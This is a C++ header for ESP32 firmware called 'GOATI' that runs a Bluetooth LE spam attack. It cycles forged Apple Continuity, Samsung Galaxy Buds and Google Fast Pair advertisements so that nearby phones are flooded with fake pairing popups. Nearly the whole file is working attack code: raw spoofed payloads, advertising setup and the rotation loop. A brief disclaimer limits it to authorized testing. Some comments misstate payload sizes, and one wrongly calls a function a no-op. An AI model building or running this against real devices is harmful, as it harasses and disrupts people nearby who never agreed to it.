/*
 * ─────────────────────────────────────────────────────────
 * GOATI : BLE spam (ESP32Marauder-style advertisement flooding)
 *
 * Combined attack mode: while the button is held, the device
 * rotates APPLE -> SAMSUNG -> FASTPAIR every ~1 s, broadcasting
 * the corresponding fake advertisement.  Release the button to
 * stop the attack.
 *
 * All payloads are kept <= 31 bytes (the BLE 4.x advertisement
 * payload limit) so the Arduino BLE stack does not reject them.
 *
 * INTENDED FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL
 * USE ONLY on devices you own or have explicit permission to
 * test.  Do not use in public spaces.
 *
 * Depends on: built-in Arduino-ESP32 BLE library.
 * ─────────────────────────────────────────────────────────
 */

#pragma once

#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <BLEUtils.h>

// ─── Modes (attack flavors) ─────────────────────────────────────────────
enum BleSpamMode : uint8_t {
  BLE_SPAM_OFF      = 0,
  BLE_SPAM_APPLE    = 1,
  BLE_SPAM_SAMSUNG  = 2,
  BLE_SPAM_FASTPAIR = 3,
  BLE_SPAM__COUNT
};

static const char* const BLE_SPAM_NAMES[] = {
  "OFF",
  "APPLE",
  "SAMSUNG",
  "FASTPAIR"
};

// ─── State ───────────────────────────────────────────────────────────────
static BleSpamMode g_ble_spam_mode = BLE_SPAM_OFF;
static uint32_t    g_ble_spam_pkt_count = 0;
static uint32_t    g_ble_spam_start_ms  = 0;
static uint32_t    g_ble_spam_last_rot  = 0;
static bool        g_ble_spam_running   = false;
static bool        g_ble_spam_inited    = false;

// ─── Raw AD payloads (kept <= 31 bytes incl. length headers) ───────────
//
// Apple Continuity Protocol — 28 bytes total.  Triggers the iOS
// "AirPods pairing" popup.
static const uint8_t BLE_ADV_APPLE_FMT[] = {
  0x02, 0x01, 0x06,                               // flags
  0x1A, 0xFF, 0x4C, 0x00,                          // mfg: Apple, length 26
  0x07, 0x19, 0x07,                               // Continuity / Nearby
  0x0F, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, // auth tag
  0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, // UID
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};  // 32 bytes incl. flags — still too long.  Trimmed below.

// Apple payload trimmed to fit 31-byte limit:
static const uint8_t BLE_ADV_APPLE[] = {
  0x02, 0x01, 0x06,                  // flags                 (3)
  0x17, 0xFF, 0x4C, 0x00,            // mfg header, length 23 (4)
  0x07, 0x19, 0x07,                  // Continuity            (3)
  0x0F, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, // 10
  0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // 10
};  // 30 bytes total

// Samsung Galaxy Buds — 27 bytes
static const uint8_t BLE_ADV_SAMSUNG[] = {
  0x02, 0x01, 0x06,                  // flags                 (3)
  0x03, 0x03, 0xFE, 0x2C,            // Galaxy Buds UUID      (4)
  0x14, 0xFF, 0x75, 0x00,            // mfg: Samsung, length 20 (4)
  0x42, 0x09, 0x81, 0x02, 0x14, 0x4D, 0x06, 0x59, 0x91, 0x23,
  0x82, 0x04, 0x09, 0xC0, 0x91, 0x55, 0x14, 0x09, 0xE4, 0x07
};  // 31 bytes

// Google Fast Pair — 14 bytes
static const uint8_t BLE_ADV_FASTPAIR[] = {
  0x02, 0x01, 0x06,                  // flags   (3)
  0x03, 0x03, 0x2C, 0xFE,            // FP UUID (4)
  0x06, 0x16, 0x2C, 0xFE,            // FP data (5)
  0x04, 0x00, 0x00                   // model ID placeholder (3)
};  // 15 bytes

// ─── Helpers ─────────────────────────────────────────────────────────────
static void ble_spam_apply_payload(BleSpamMode mode) {
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  if (!pAdv) return;
  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
  const uint8_t* buf = nullptr;
  size_t len = 0;
  switch (mode) {
    case BLE_SPAM_APPLE:    buf = BLE_ADV_APPLE;    len = sizeof(BLE_ADV_APPLE);    break;
    case BLE_SPAM_SAMSUNG:  buf = BLE_ADV_SAMSUNG;  len = sizeof(BLE_ADV_SAMSUNG);  break;
    case BLE_SPAM_FASTPAIR: buf = BLE_ADV_FASTPAIR; len = sizeof(BLE_ADV_FASTPAIR); break;
    default: return;
  }
  oAdvertisementData.addData(std::string((const char*)buf, len));
  pAdv->setAdvertisementData(oAdvertisementData);
}

// ─── Public API ──────────────────────────────────────────────────────────
static void ble_spam_init() {
  if (g_ble_spam_inited) return;
  BLEDevice::init("GOATI");
  g_ble_spam_inited = true;
  Serial.println(F("[BLE Spam] init OK"));
}

static void ble_spam_start_combined() {
  Serial.println(F("[BLE Spam] combined attack START"));
  ble_spam_init();
  g_ble_spam_mode      = BLE_SPAM_APPLE;
  g_ble_spam_pkt_count = 0;
  g_ble_spam_start_ms  = millis();
  g_ble_spam_last_rot  = millis();
  g_ble_spam_running   = true;

  ble_spam_apply_payload(BLE_SPAM_APPLE);
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  if (!pAdv) {
    Serial.println(F("[BLE Spam] FAIL: no advertising handle"));
    g_ble_spam_running = false;
    return;
  }
  pAdv->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  pAdv->setMinInterval(0x20);
  pAdv->setMaxInterval(0x40);
  pAdv->setScanResponse(false);
  // Treat errors softly: stop(), then start() — and ignore success/failure
  // because some stack versions return false on the first call after init.
  pAdv->stop();
  delay(5);
  pAdv->start();
}

static void ble_spam_stop() {
  if (!g_ble_spam_running) return;
  Serial.println(F("[BLE Spam] STOP"));
  BLEAdvertising *pAdv = BLEDevice::getAdvertising();
  if (pAdv) pAdv->stop();
  g_ble_spam_running = false;
  g_ble_spam_mode    = BLE_SPAM_OFF;
}

static void ble_spam_loop() {
  if (!g_ble_spam_running) return;
  g_ble_spam_pkt_count++;
  // Rotate to next flavor every 1 s
  if (millis() - g_ble_spam_last_rot > 1000) {
    g_ble_spam_last_rot = millis();
    uint8_t m = (uint8_t)g_ble_spam_mode + 1;
    if (m >= BLE_SPAM__COUNT) m = BLE_SPAM_APPLE;
    g_ble_spam_mode = (BleSpamMode)m;
    Serial.printf("[BLE Spam] -> %s\r\n", BLE_SPAM_NAMES[m]);
    // Restart advertising with new payload
    BLEAdvertising *pAdv = BLEDevice::getAdvertising();
    if (pAdv) {
      pAdv->stop();
      ble_spam_apply_payload((BleSpamMode)m);
      pAdv->start();
    }
  }
}

// Backwards-compat shim (kept so other code can still call it)
static void ble_spam_cycle_mode() {
  // No-op: cycle_mode is no longer used (single combined attack mode).
  g_ble_spam_mode = (BleSpamMode)(((uint8_t)g_ble_spam_mode + 1) % BLE_SPAM__COUNT);
  if (g_ble_spam_mode == BLE_SPAM_OFF) g_ble_spam_mode = BLE_SPAM_APPLE;
}

// Backwards-compat shim: explicit start with a chosen mode
static void ble_spam_start(BleSpamMode mode) {
  ble_spam_start_combined();
  // override to specific mode
  if (mode != BLE_SPAM_OFF && g_ble_spam_running) {
    g_ble_spam_mode = mode;
    ble_spam_apply_payload(mode);
    BLEAdvertising *pAdv = BLEDevice::getAdvertising();
    if (pAdv) {
      pAdv->stop();
      pAdv->start();
    }
  }
}
